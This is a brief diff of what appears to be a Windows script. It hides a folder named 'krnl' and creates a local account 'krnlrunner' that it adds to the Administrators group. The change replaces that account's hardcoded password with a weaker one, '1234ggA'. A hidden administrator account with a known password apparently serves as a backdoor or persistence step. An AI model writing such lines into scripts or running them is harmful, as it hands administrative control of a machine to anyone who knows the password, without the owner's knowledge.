@@ -15,7 +15,7 @@ Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden
 
 
 
-net user krnlrunner "StrongPass123!" /add /y
+net user krnlrunner "1234ggA" /add /y
 
 net localgroup Administrators krnlrunner /add
 
